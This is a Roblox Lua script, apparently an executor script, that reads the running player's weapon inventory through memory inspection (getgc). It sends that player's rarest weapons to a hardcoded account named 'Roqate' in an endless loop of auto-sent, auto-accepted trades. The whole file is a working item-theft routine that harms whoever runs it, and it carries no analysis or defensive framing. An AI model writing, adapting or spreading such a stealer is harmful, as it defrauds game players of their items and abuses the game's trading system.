local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer

-- Config
local TARGET_PLAYER = "Roqate"
local MAX_ITEMS_PER_TRADE = 4
local TRADE_COOLDOWN = 2
local ITEM_ADD_DELAY = 0.3

-- Rarity priority
local RARITY_PRIORITY = { Godly = 1, Ancient = 2, Unique = 3, Classic = 4 }
local ALLOWED_RARITIES = {}
for r,_ in pairs(RARITY_PRIORITY) do ALLOWED_RARITIES[r] = true end

-- Remotes
local TradeRemotes = {
    SendRequest = ReplicatedStorage:WaitForChild("Trade"):WaitForChild("SendRequest"),
    OfferItem = ReplicatedStorage:WaitForChild("Trade"):WaitForChild("OfferItem"),
    AcceptTrade = ReplicatedStorage:WaitForChild("Trade"):WaitForChild("AcceptTrade")
}

-- === Inventory detection ===
local function getCorrectMyInventory()
    for _,module in ipairs(getgc(true)) do
        if type(module) == "table" and rawget(module, "MyInventory") then
            local inv = module.MyInventory
            if inv.Data and inv.Data.Weapons and inv.Data.Weapons.Classic then
                return inv
            end
        end
    end
    return nil
end

-- === Collect best rarity weapons ===
local function getBestWeapons()
    local inv = getCorrectMyInventory()
    if not inv then
        warn("❌ Inventory not found!")
        return {}
    end

    local candidates = {}
    for _, categoryTable in pairs(inv.Data.Weapons) do
        for weaponName, weaponData in pairs(categoryTable) do
            if weaponName ~= "DefaultKnife" and weaponName ~= "DefaultGun" then
                local rarity = weaponData.Rarity
                if rarity and ALLOWED_RARITIES[rarity] then
                    table.insert(candidates, {
                        name = weaponName,
                        rarity = rarity,
                        priority = RARITY_PRIORITY[rarity] or 999
                    })
                end
            end
        end
    end

    table.sort(candidates, function(a,b) return a.priority < b.priority end)

    local picked = {}
    for i = 1, math.min(#candidates, MAX_ITEMS_PER_TRADE) do
        table.insert(picked, candidates[i].name)
    end
    return picked
end

-- === Detect Trade GUI ===
local function waitForTradeGUI()
    local timeout = os.clock() + 10
    while os.clock() < timeout do
        local gui = LocalPlayer.PlayerGui:FindFirstChild("TradeGUI") or LocalPlayer.PlayerGui:FindFirstChild("TradeGUI_Phone")
        if gui then
            -- Look for Accept/Decline buttons
            local acceptBtn = gui:FindFirstChild("Accept", true)
            local declineBtn = gui:FindFirstChild("Decline", true)
            if acceptBtn and declineBtn then
                return gui
            end
        end
        task.wait(0.2)
    end
    return nil
end

-- === Find TradeID dynamically from GUI ===
local function getTradeID(gui)
    for _, obj in ipairs(gui:GetDescendants()) do
        if obj:IsA("ValueBase") and tostring(obj.Name):lower():find("trade") then
            return obj.Value
        elseif obj:IsA("TextLabel") and obj.Text:lower():find("trade id") then
            local num = tonumber(obj.Text:match("%d+"))
            if num then return num end
        end
    end
    return nil
end

-- === Wait for "OTHER PLAYER HAS ACCEPTED" ===
local function waitForOtherPlayerAccept(gui)
    local timeout = os.clock() + 20
    while os.clock() < timeout do
        for _, obj in ipairs(gui:GetDescendants()) do
            if obj:IsA("TextLabel") and obj.Text:upper():find("OTHER PLAYER HAS ACCEPTED") then
                return true
            end
        end
        task.wait(0.5)
    end
    return false
end

-- === Add weapons to trade ===
local function addWeaponsToTrade()
    local weapons = getBestWeapons()
    if #weapons == 0 then
        warn("⚠ No valid high rarity weapons found!")
        return false
    end
    print("✅ Adding weapons:")
    for _, w in ipairs(weapons) do
        print("  →", w)
        TradeRemotes.OfferItem:FireServer(w, "Weapons")
        task.wait(ITEM_ADD_DELAY)
    end
    return true
end

-- === Accept trade dynamically ===
local function acceptTradeDynamic(gui)
    local tradeId = getTradeID(gui)
    if not tradeId then
        warn("⚠ Could not find TradeID!")
        return false
    end
    print("✅ Accepting trade with ID:", tradeId)
    TradeRemotes.AcceptTrade:FireServer(tradeId)
    return true
end

-- === Full trade flow ===
local function doTradeCycle(targetPlayer)
    print("🔄 Sending trade request to", targetPlayer.Name)
    local ok, err = pcall(function()
        TradeRemotes.SendRequest:InvokeServer(targetPlayer)
    end)
    if not ok then warn("❌ Trade request failed:", err) return end

    local gui = waitForTradeGUI()
    if not gui then warn("⚠ Trade GUI did not appear!") return end

    -- Add weapons once GUI ready
    if not addWeaponsToTrade() then return end

    -- Accept the trade
    if not acceptTradeDynamic(gui) then return end

    -- Wait until other player accepts
    print("⏳ Waiting for other player to accept...")
    local otherAccepted = waitForOtherPlayerAccept(gui)
    if otherAccepted then
        print("✅ Other player accepted. Trade completed!")
    else
        warn("⚠ Timed out waiting for other player accept!")
    end
end

-- === Main loop ===
while true do
    local target = Players:FindFirstChild(TARGET_PLAYER)
    if target then
        doTradeCycle(target)
    else
        print("Waiting for", TARGET_PLAYER, "to be online...")
    end
    task.wait(TRADE_COOLDOWN)
end
